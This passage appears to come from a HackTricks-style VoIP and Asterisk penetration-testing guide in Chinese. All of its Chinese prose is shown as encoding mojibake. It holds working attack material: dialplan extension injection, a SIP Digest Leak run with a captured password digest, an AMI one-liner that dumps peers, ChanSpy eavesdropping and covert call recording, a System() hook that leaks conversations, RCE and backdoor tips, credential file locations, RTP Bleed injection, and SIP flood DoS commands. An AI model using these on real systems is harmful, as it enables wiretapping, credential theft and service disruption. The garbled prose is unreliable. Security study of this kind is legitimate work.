5. **ä¸å¤–éƒ¨ç³»ç»Ÿé›†æˆ**ï¼šå°†IVRç³»ç»Ÿè¿æ¥åˆ°æ•°æ®åº“æˆ–å…¶ä»–è½¯ä»¶ç³»ç»Ÿï¼Œä»¥è®¿é—®æˆ–æ›´æ–°ä¿¡æ¯ã€æ‰§è¡Œæ“ä½œæˆ–è§¦å‘äº‹ä»¶ã€‚

åœ¨Asterisk VoIPç³»ç»Ÿä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨æ‹¨å·è®¡åˆ’ï¼ˆ**`extensions.conf`**æ–‡ä»¶ï¼‰å’Œå„ç§åº”ç”¨ç¨‹åºï¼ˆå¦‚`Background()`ã€`Playback()`ã€`Read()`ç­‰ï¼‰åˆ›å»ºIVRã€‚è¿™äº›åº”ç”¨ç¨‹åºå¸®åŠ©æ‚¨æ’­æ”¾è¯­éŸ³æç¤ºï¼Œæ•è·ç”¨æˆ·è¾“å…¥å¹¶æ§åˆ¶å‘¼å«æµç¨‹ã€‚

#### è„†å¼±é…ç½®ç¤ºä¾‹
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
å‰é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œç”¨æˆ·è¢«è¦æ±‚æŒ‰ä¸‹1æ¥å‘¼å«ä¸€ä¸ªéƒ¨é—¨ï¼ŒæŒ‰ä¸‹2æ¥å‘¼å«å¦ä¸€ä¸ªéƒ¨é—¨ï¼Œæˆ–è€…å¦‚æœä»–çŸ¥é“çš„è¯ï¼Œè¾“å…¥å®Œæ•´çš„åˆ†æœºå·ç ã€‚\
æ¼æ´åœ¨äºæ²¡æœ‰æ£€æŸ¥æŒ‡å®šçš„åˆ†æœºå·ç é•¿åº¦ï¼Œå› æ­¤ç”¨æˆ·å¯ä»¥è¾“å…¥å®Œæ•´çš„å·ç å¹¶è¿›è¡Œå‘¼å«ã€‚

### åˆ†æœºæ³¨å…¥

ä½¿ç”¨ä»¥ä¸‹åˆ†æœºå·ç ï¼š
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
å½“è¾“å…¥**`${EXTEN}`**çš„æ—¶å€™ï¼Œå°†ä¼šå‘¼å«åˆ°å¯¹åº”çš„**åˆ†æœº**ã€‚å½“è¾“å…¥**ext 101**æ—¶ï¼Œä¼šå‘ç”Ÿä»¥ä¸‹æƒ…å†µï¼š
```scss
exten => 101,1,Dial(SIP/101)
```
ç„¶è€Œï¼Œå¦‚æœ`${EXTEN}`å…è®¸è¾“å…¥**ä¸ä»…ä»…æ˜¯æ•°å­—**ï¼ˆå°±åƒåœ¨æ—§ç‰ˆAsteriskä¸­ä¸€æ ·ï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥è¾“å…¥**`101&SIP123123123`**æ¥æ‹¨æ‰“ç”µè¯å·ç 123123123ã€‚ç»“æœå°†å¦‚ä¸‹æ‰€ç¤ºï¼š
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
å› æ­¤ï¼Œå¯¹åˆ†æœºå·**`101`**å’Œ**`123123123`**çš„å‘¼å«å°†è¢«å‘é€ï¼Œåªæœ‰ç¬¬ä¸€ä¸ªæ¥å¬å‘¼å«çš„åˆ†æœºä¼šå»ºç«‹è¿æ¥...ä½†æ˜¯ï¼Œå¦‚æœæ”»å‡»è€…ä½¿ç”¨ä¸€ä¸ªç»•è¿‡æ­£åœ¨æ‰§è¡Œçš„ä»»ä½•åŒ¹é…ä½†ä¸å­˜åœ¨çš„åˆ†æœºçš„**åˆ†æœº**ï¼Œä»–å¯ä»¥**æ³¨å…¥å‘¼å«åˆ°æ‰€éœ€çš„å·ç **ã€‚

## SIPDigestLeak

SIP Digest Leakæ˜¯ä¸€ç§å½±å“å¤§é‡SIPç”µè¯çš„æ¼æ´ï¼ŒåŒ…æ‹¬ç¡¬ä»¶å’Œè½¯ä»¶IPç”µè¯ä»¥åŠç”µè¯é€‚é…å™¨ï¼ˆVoIPåˆ°æ¨¡æ‹Ÿç”µè¯ï¼‰ã€‚è¯¥æ¼æ´å…è®¸**æ³„éœ²Digestèº«ä»½éªŒè¯å“åº”**ï¼Œè¯¥å“åº”æ˜¯ä»å¯†ç è®¡ç®—å‡ºæ¥çš„ã€‚ç„¶åå¯ä»¥è¿›è¡Œ**ç¦»çº¿å¯†ç æ”»å‡»**ï¼Œå¹¶æ ¹æ®æŒ‘æˆ˜å“åº”æ¢å¤å¤§å¤šæ•°å¯†ç ã€‚

æ¼æ´åœºæ™¯ï¼ˆæœ‰å…³[**æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹æ­¤å¤„**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)ï¼‰ï¼š

1. ä¸€ä¸ªIPç”µè¯ï¼ˆå—å®³è€…ï¼‰æ­£åœ¨ç›‘å¬ç«¯å£5060ï¼Œæ¥å—ç”µè¯
2. æ”»å‡»è€…å‘IPç”µè¯å‘é€INVITE
3. å—å®³è€…ç”µè¯å¼€å§‹å“é“ƒï¼Œæœ‰äººæ¥å¬å¹¶æŒ‚æ–­ï¼ˆå› ä¸ºå¦ä¸€ç«¯æ²¡æœ‰äººæ¥å¬ç”µè¯ï¼‰
4. å½“ç”µè¯æŒ‚æ–­æ—¶ï¼Œ**å—å®³è€…ç”µè¯å‘æ”»å‡»è€…å‘é€BYE**
5. æ”»å‡»è€…å‘å‡ºä¸€ä¸ªè¦æ±‚èº«ä»½éªŒè¯çš„**407å“åº”**å¹¶å‘å‡ºä¸€ä¸ªèº«ä»½éªŒè¯æŒ‘æˆ˜
6. **å—å®³è€…ç”µè¯åœ¨ç¬¬äºŒä¸ªBYEä¸­æä¾›å¯¹èº«ä»½éªŒè¯æŒ‘æˆ˜çš„å“åº”**
7. æ”»å‡»è€…å¯ä»¥åœ¨æœ¬åœ°æœºå™¨ä¸Šï¼ˆæˆ–åˆ†å¸ƒå¼ç½‘ç»œç­‰ï¼‰å¯¹æŒ‘æˆ˜å“åº”è¿›è¡Œæš´åŠ›æ”»å‡»ï¼Œå¹¶çŒœæµ‹å¯†ç 

* **sipdigestleak.py** æ¥è‡ª[**sippts**](https://github.com/Pepelux/sippts)**ï¼š** SipDigestLeakåˆ©ç”¨äº†è¿™ä¸ªæ¼æ´ã€‚
```bash
python3 sipdigestleak.py -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### ç‚¹å‡»æ‹¨å·

ç‚¹å‡»æ‹¨å·å…è®¸ä¸€ä¸ª**ç½‘é¡µç”¨æˆ·**ï¼ˆä¾‹å¦‚å¯èƒ½å¯¹æŸä¸ªäº§å“æ„Ÿå…´è¶£ï¼‰è¾“å…¥ä»–çš„**ç”µè¯å·ç **ä»¥ä¾¿è¢«å‘¼å«ã€‚ç„¶åä¼šæ‹¨æ‰“å•†å®¶çš„ç”µè¯ï¼Œå½“ä»–**æ¥å¬ç”µè¯**æ—¶ï¼Œç”¨æˆ·å°†è¢«**å‘¼å«å¹¶ä¸ä»£ç†äººè¿æ¥**ã€‚

è¿™ç§æƒ…å†µä¸‹å¸¸è§çš„Asteriské…ç½®æ–‡ä»¶ä¸ºï¼š
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* å…ˆå‰çš„é…ç½®æ–‡ä»¶å…è®¸**ä»»ä½•IPåœ°å€è¿æ¥**ï¼ˆå¦‚æœçŸ¥é“å¯†ç ï¼‰ã€‚
* è¦è¿›è¡Œå‘¼å«ï¼Œå¦‚å…ˆå‰æŒ‡å®šçš„ï¼Œ**ä¸éœ€è¦è¯»å–æƒé™**ï¼Œåªéœ€è¦**å†™å…¥**ä¸­çš„**å‘èµ·**æƒé™ã€‚

æœ‰äº†è¿™äº›æƒé™ï¼Œä»»ä½•çŸ¥é“å¯†ç çš„IPéƒ½å¯ä»¥è¿æ¥å¹¶æå–è¿‡å¤šçš„ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**æ›´å¤šä¿¡æ¯æˆ–æ“ä½œå¯èƒ½ä¼šè¢«è¯·æ±‚ã€‚**

### **çªƒå¬**

åœ¨Asteriskä¸­ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤**`ChanSpy`**æ¥æŒ‡ç¤ºè¦ç›‘è§†çš„**åˆ†æœºå·ç **ï¼ˆæˆ–æ‰€æœ‰åˆ†æœºå·ç ï¼‰ï¼Œä»¥ä¾¿å¬å–æ­£åœ¨è¿›è¡Œçš„å¯¹è¯ã€‚æ­¤å‘½ä»¤éœ€è¦åˆ†é…ç»™ä¸€ä¸ªåˆ†æœºå·ç ã€‚

ä¾‹å¦‚ï¼Œ**`exten => 333,1,ChanSpy('all',qb)`**è¡¨ç¤ºå¦‚æœæ‚¨**å‘¼å«**åˆ†æœºå·ç **333**ï¼Œå®ƒå°†**ç›‘è§†**æ‰€æœ‰åˆ†æœºå·ç ï¼Œ**åœ¨æ–°å¯¹è¯å¼€å§‹æ—¶**ï¼ˆ**`b`**ï¼‰ä»¥å®‰é™æ¨¡å¼ï¼ˆ**`q`**ï¼‰å¼€å§‹**æ”¶å¬**ï¼Œå› ä¸ºæˆ‘ä»¬ä¸æƒ³è¿›è¡Œå¹²é¢„ã€‚æ‚¨å¯ä»¥é€šè¿‡æŒ‰ä¸‹**`*`**æˆ–æ ‡è®°åˆ†æœºå·ç æ¥åˆ‡æ¢åˆ°å¦ä¸€ä¸ªæ­£åœ¨è¿›è¡Œçš„å¯¹è¯ã€‚

è¿˜å¯ä»¥ä½¿ç”¨**`ExtenSpy`**æ¥ä»…ç›‘è§†ä¸€ä¸ªåˆ†æœºå·ç ã€‚

é™¤äº†æ”¶å¬å¯¹è¯å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ä»¥ä¸‹åˆ†æœºå·ç å°†å…¶**è®°å½•åœ¨æ–‡ä»¶ä¸­**ï¼š

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

é€šè¯å°†ä¿å­˜åœ¨ **`/tmp`** ä¸­ã€‚

æ‚¨ç”šè‡³å¯ä»¥è®©Asteriskåœ¨å…³é—­æ—¶æ‰§è¡Œä¸€ä¸ªè„šæœ¬ï¼Œä»¥æ³„éœ²é€šè¯ä¿¡æ¯ã€‚
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed

**RTCPBleed**æ˜¯ä¸€ä¸ªå½±å“åŸºäºAsteriskçš„VoIPæœåŠ¡å™¨çš„é‡å¤§å®‰å…¨é—®é¢˜ï¼ˆäº2017å¹´å‘å¸ƒï¼‰ã€‚è¯¥æ¼æ´å…è®¸**RTPï¼ˆå®æ—¶ä¼ è¾“åè®®ï¼‰æµé‡**ï¼Œå³VoIPé€šè¯ï¼Œè¢«**ä»»ä½•äº’è”ç½‘ä¸Šçš„äººæ‹¦æˆªå’Œé‡å®šå‘**ã€‚è¿™æ˜¯å› ä¸ºRTPæµé‡åœ¨é€šè¿‡NATï¼ˆç½‘ç»œåœ°å€è½¬æ¢ï¼‰é˜²ç«å¢™æ—¶ç»•è¿‡èº«ä»½éªŒè¯ã€‚

RTPä»£ç†è¯•å›¾è§£å†³å½±å“RTCç³»ç»Ÿçš„NATé™åˆ¶ï¼Œé€šè¿‡åœ¨ä¸¤ä¸ªæˆ–å¤šä¸ªæ–¹ä¹‹é—´ä»£ç†RTPæµã€‚å½“å­˜åœ¨NATæ—¶ï¼ŒRTPä»£ç†è½¯ä»¶é€šå¸¸æ— æ³•ä¾èµ–é€šè¿‡ä¿¡ä»¤ï¼ˆä¾‹å¦‚SIPï¼‰æ£€ç´¢åˆ°çš„RTP IPå’Œç«¯å£ä¿¡æ¯ã€‚å› æ­¤ï¼Œè®¸å¤šRTPä»£ç†å·²ç»å®ç°äº†ä¸€ç§æœºåˆ¶ï¼Œé€šè¿‡è‡ªåŠ¨å­¦ä¹ è¿™æ ·çš„**IPå’Œç«¯å£å…ƒç»„**ã€‚è¿™é€šå¸¸æ˜¯é€šè¿‡æ£€æŸ¥ä¼ å…¥çš„RTPæµé‡å¹¶å°†ä»»ä½•ä¼ å…¥RTPæµé‡çš„æºIPå’Œç«¯å£æ ‡è®°ä¸ºåº”è¯¥å“åº”çš„IPå’Œç«¯å£æ¥å®Œæˆçš„ã€‚è¿™ç§æœºåˆ¶ï¼Œå¯èƒ½è¢«ç§°ä¸ºâ€œå­¦ä¹ æ¨¡å¼â€ï¼Œ**ä¸ä½¿ç”¨ä»»ä½•å½¢å¼çš„èº«ä»½éªŒè¯**ã€‚å› æ­¤ï¼Œ**æ”»å‡»è€…**å¯ä»¥**å‘RTPä»£ç†å‘é€RTPæµé‡**å¹¶æ¥æ”¶åˆ°ç”¨äºå‘¼å«è€…æˆ–è¢«å«æ–¹çš„æ­£åœ¨è¿›è¡Œçš„RTPæµçš„ä»£ç†RTPæµé‡ã€‚æˆ‘ä»¬å°†æ­¤æ¼æ´ç§°ä¸ºRTP Bleedï¼Œå› ä¸ºå®ƒå…è®¸æ”»å‡»è€…æ¥æ”¶åº”è¯¥å‘é€ç»™åˆæ³•ç”¨æˆ·çš„RTPåª’ä½“æµã€‚

RTPä»£ç†å’ŒRTPå †æ ˆçš„å¦ä¸€ä¸ªæœ‰è¶£è¡Œä¸ºæ˜¯ï¼Œæœ‰æ—¶ï¼Œ**å³ä½¿ä¸å®¹æ˜“å—åˆ°RTP Bleedçš„å½±å“**ï¼Œå®ƒä»¬ä¹Ÿä¼š**æ¥å—ã€è½¬å‘å’Œ/æˆ–å¤„ç†æ¥è‡ªä»»ä½•æºçš„RTPæ•°æ®åŒ…**ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥å‘é€RTPæ•°æ®åŒ…ï¼Œè¿™å¯èƒ½å…è®¸ä»–ä»¬æ³¨å…¥éæ³•åª’ä½“è€Œä¸æ˜¯åˆæ³•åª’ä½“ã€‚æˆ‘ä»¬å°†æ­¤æ”»å‡»ç§°ä¸ºRTPæ³¨å…¥ï¼Œå› ä¸ºå®ƒå…è®¸å°†éæ³•RTPæ•°æ®åŒ…æ³¨å…¥åˆ°ç°æœ‰çš„RTPæµä¸­ã€‚è¿™ç§æ¼æ´å¯èƒ½å­˜åœ¨äºRTPä»£ç†å’Œç»ˆç«¯è®¾å¤‡ä¸­ã€‚

Asteriskå’ŒFreePBXä¼ ç»Ÿä¸Šä½¿ç”¨**`NAT=yes`è®¾ç½®**ï¼Œè¯¥è®¾ç½®å…è®¸RTPæµé‡ç»•è¿‡èº«ä»½éªŒè¯ï¼Œå¯èƒ½å¯¼è‡´é€šè¯ä¸­æ²¡æœ‰éŸ³é¢‘æˆ–å•å‘éŸ³é¢‘ã€‚

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·è®¿é—®[https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`rtpbleed.py`**æ¥è‡ª[**sippts**](https://github.com/Pepelux/sippts)**ï¼š**å®ƒé€šè¿‡å‘é€RTPæµæ¥æ£€æµ‹RTP Bleedæ¼æ´ã€‚
```bash
python3 rtpbleed.py -i 10.10.0.10
```
* **`rtcpbleed.py`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**ï¼š** å®ƒé€šè¿‡å‘é€ RTP æµæ¥æ£€æµ‹ RTP Bleed æ¼æ´
```bash
python3 rtcpbleed.py -i 10.10.0.10
```
* **`rtpbleedflood.py`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**ï¼š** åˆ©ç”¨ RTP Bleed æ¼æ´å‘é€ RTP æµçš„æ”»å‡»å·¥å…·
```bash
python3 rtpbleedflood.py -i 10.10.0.10 -p 10070 -v
```
* **`rtpbleedinject.py`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**ï¼š** åˆ©ç”¨ RTP Bleed æ¼æ´å‘é€ RTP æµï¼ˆæ¥è‡ªéŸ³é¢‘æ–‡ä»¶ï¼‰çš„æ¼æ´åˆ©ç”¨ç¨‹åº
```bash
python3 rtpbleedinject.py -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCEï¼ˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼‰

åœ¨Asteriskä¸­ï¼Œå¦‚æœä½ ä»¥æŸç§æ–¹å¼èƒ½å¤Ÿ**æ·»åŠ æ‰©å±•è§„åˆ™å¹¶é‡æ–°åŠ è½½å®ƒä»¬**ï¼ˆä¾‹å¦‚é€šè¿‡æ”»å‡»ä¸€ä¸ªå­˜åœ¨æ¼æ´çš„Webç®¡ç†æœåŠ¡å™¨ï¼‰ï¼Œå°±å¯ä»¥ä½¿ç”¨**`System`**å‘½ä»¤å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰ã€‚
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
æœ‰ä¸€ä¸ªåä¸º**`Shell`**çš„å‘½ä»¤ï¼Œå¯ä»¥åœ¨å¿…è¦æ—¶ç”¨æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè€Œä¸æ˜¯ä½¿ç”¨`System`å‘½ä»¤ã€‚

{% hint style="warning" %}
å¦‚æœæœåŠ¡å™¨ç¦æ­¢åœ¨`System`å‘½ä»¤ä¸­ä½¿ç”¨æŸäº›å­—ç¬¦ï¼ˆä¾‹å¦‚åœ¨Elastixä¸­ï¼‰ï¼Œè¯·æ£€æŸ¥WebæœåŠ¡å™¨æ˜¯å¦å…è®¸ä»¥æŸç§æ–¹å¼åœ¨ç³»ç»Ÿå†…éƒ¨åˆ›å»ºæ–‡ä»¶ï¼ˆä¾‹å¦‚åœ¨Elastixæˆ–trixboxä¸­ï¼‰ï¼Œç„¶åä½¿ç”¨å®ƒæ¥åˆ›å»ºä¸€ä¸ªåé—¨è„šæœ¬ï¼Œç„¶åä½¿ç”¨`System`æ¥æ‰§è¡Œè¯¥è„šæœ¬ã€‚
{% endhint %}

#### æœ‰è¶£çš„æœ¬åœ°æ–‡ä»¶å’Œæƒé™

* **`sip.conf`** -> åŒ…å«SIPç”¨æˆ·çš„å¯†ç ã€‚
* å¦‚æœAsteriskæœåŠ¡å™¨ä»¥rootèº«ä»½è¿è¡Œï¼Œæ‚¨å¯ä»¥å¦¥årootæƒé™ã€‚
* **mysql rootç”¨æˆ·**å¯èƒ½**æ²¡æœ‰ä»»ä½•å¯†ç **ã€‚
* è¿™å¯ä»¥ç”¨æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„mysqlç”¨æˆ·ä½œä¸ºåé—¨ã€‚
* **`FreePBX`**
* **`amportal.conf`** -> åŒ…å«Webé¢æ¿ç®¡ç†å‘˜ï¼ˆFreePBXï¼‰çš„å¯†ç ã€‚
* **`FreePBX.conf`** -> åŒ…å«ç”¨äºè®¿é—®æ•°æ®åº“çš„FreePBXuserç”¨æˆ·çš„å¯†ç ã€‚
* è¿™å¯ä»¥ç”¨æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„mysqlç”¨æˆ·ä½œä¸ºåé—¨ã€‚
* **`Elastix`**
* **`Elastix.conf`** -> åŒ…å«æ˜æ–‡å¯†ç ï¼Œå¦‚mysql rootå¯†ç ï¼ŒIMAPdå¯†ç ï¼ŒWebç®¡ç†å‘˜å¯†ç ã€‚
* **å¤šä¸ªæ–‡ä»¶å¤¹**å°†å±äºå—æŸçš„asteriskç”¨æˆ·ï¼ˆå¦‚æœä¸ä»¥rootèº«ä»½è¿è¡Œï¼‰ã€‚è¯¥ç”¨æˆ·å¯ä»¥è¯»å–å‰é¢çš„æ–‡ä»¶ï¼Œå¹¶ä¸”è¿˜å¯ä»¥æ§åˆ¶é…ç½®ï¼Œå› æ­¤ä»–å¯ä»¥åœ¨æ‰§è¡Œæ—¶ä½¿AsteriskåŠ è½½å…¶ä»–åé—¨äºŒè¿›åˆ¶æ–‡ä»¶ã€‚

### RTPæ³¨å…¥

å¯ä»¥ä½¿ç”¨å·¥å…·å¦‚**`rtpinsertsound`**ï¼ˆ`sudo apt install rtpinsertsound`ï¼‰å’Œ**`rtpmixsound`**ï¼ˆ`sudo apt install rtpmixsound`ï¼‰æ¥åœ¨å¯¹è¯ä¸­æ’å…¥**`.wav`**ã€‚

æˆ–è€…æ‚¨å¯ä»¥ä½¿ç”¨æ¥è‡ª[http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/)çš„è„šæœ¬æ¥**æ‰«æå¯¹è¯**ï¼ˆ**`rtpscan.pl`**ï¼‰ï¼Œå‘å¯¹è¯å‘é€`.wav`ï¼ˆ**`rtpsend.pl`**ï¼‰å¹¶åœ¨å¯¹è¯ä¸­æ’å…¥å™ªéŸ³ï¼ˆ**`rtpflood.pl`**ï¼‰ã€‚

### DoS

æœ‰å‡ ç§æ–¹æ³•å¯ä»¥å°è¯•åœ¨VoIPæœåŠ¡å™¨ä¸Šå®ç°DoSã€‚

* æ¥è‡ª[**sippts**](https://github.com/Pepelux/sippts)çš„**`sipflood.py`**ï¼š**_**SipFlood**_å‘ç›®æ ‡å‘é€æ— é™æ•°é‡çš„æ¶ˆæ¯
* `python3 sipflood.py -i 10.10.0.10 -r 5080 -m invite -v`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/)ï¼šDoS Asteriskä½¿ç”¨çš„IAXåè®®
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt)ï¼šç”¨äºåœ¨UDP/IPä¸Šæ‰§è¡ŒSIP/SDP INVITEæ¶ˆæ¯æ´ªæ°´æ”»å‡»çš„å·¥å…·ã€‚
* [**rtpflood**](https://www.kali.org/tools/rtpflood/)ï¼šå‘é€å¤šä¸ªæ ¼å¼æ­£ç¡®çš„RTPæ•°æ®åŒ…ã€‚éœ€è¦çŸ¥é“æ­£åœ¨ä½¿ç”¨çš„RTPç«¯å£ï¼ˆå…ˆè¿›è¡Œå—…æ¢ï¼‰ã€‚
* [**SIPp**](https://github.com/SIPp/sipp)ï¼šå…è®¸åˆ†æå’Œç”ŸæˆSIPæµé‡ã€‚å› æ­¤ä¹Ÿå¯ä»¥ç”¨äºDoSæ”»å‡»ã€‚
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak)ï¼šSIPç‘å£«å†›åˆ€ã€‚ä¹Ÿå¯ä»¥ç”¨äºæ‰§è¡ŒSIPæ”»å‡»ã€‚
* Fuzzersï¼š[**protos-sip**](https://www.kali.org/tools/protos-sip/)ï¼Œ[**voiper**](https://github.com/gremwell/voiper)ã€‚
* æ¥è‡ª[**sippts**](https://github.com/Pepelux/sippts)çš„**`sipsend.py`**ï¼šSIPSendå…è®¸æˆ‘ä»¬å‘é€è‡ªå®šä¹‰çš„SIPæ¶ˆæ¯å¹¶åˆ†æå“åº”ã€‚
* æ¥è‡ª[**sippts**](https://github.com/Pepelux/sippts)çš„**`wssend.py`**ï¼šWsSendå…è®¸æˆ‘ä»¬é€šè¿‡WebSocketså‘é€è‡ªå®šä¹‰çš„SIPæ¶ˆæ¯å¹¶åˆ†æå“åº”ã€‚

### æ“ä½œç³»ç»Ÿæ¼æ´

å®‰è£…Asteriskç­‰è½¯ä»¶çš„æœ€ç®€å•æ–¹æ³•æ˜¯ä¸‹è½½å·²ç»å®‰è£…äº†å®ƒçš„æ“ä½œç³»ç»Ÿåˆ†å‘ç‰ˆï¼Œä¾‹å¦‚ï¼š**FreePBXï¼ŒElastixï¼ŒTrixbox**... ä½†è¿™äº›åˆ†å‘ç‰ˆä¸€æ—¦å¼€å§‹è¿è¡Œï¼Œç³»ç»Ÿç®¡ç†å‘˜å¯èƒ½å°±ä¸ä¼šå†æ›´æ–°å®ƒä»¬ï¼Œè€Œéšç€æ—¶é—´çš„æ¨ç§»ï¼Œæ¼æ´å°†è¢«å‘ç°ã€‚

## å‚è€ƒèµ„æ–™

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­**ä¸ºæ‚¨çš„å…¬å¸åšå¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTricksè¡£ç‰©**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
